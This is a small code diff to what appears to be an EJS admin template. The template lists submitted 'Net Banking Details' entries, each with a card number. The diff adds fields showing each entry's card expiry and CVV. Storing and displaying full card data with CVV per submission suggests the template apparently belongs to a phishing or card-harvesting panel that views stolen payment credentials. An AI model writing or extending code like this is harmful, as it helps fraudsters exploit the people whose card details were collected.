@@ -52,6 +52,8 @@
         <div class="card">
           <h3>Net Banking Details - <%= index + 1 %></h3>
           <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
+          <p><strong>Expiry:</strong> <%= entry.expiry %></p>
+          <p><strong>CVV:</strong> <%= entry.cvv %></p>
           <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
         </div>
       <% }); %>
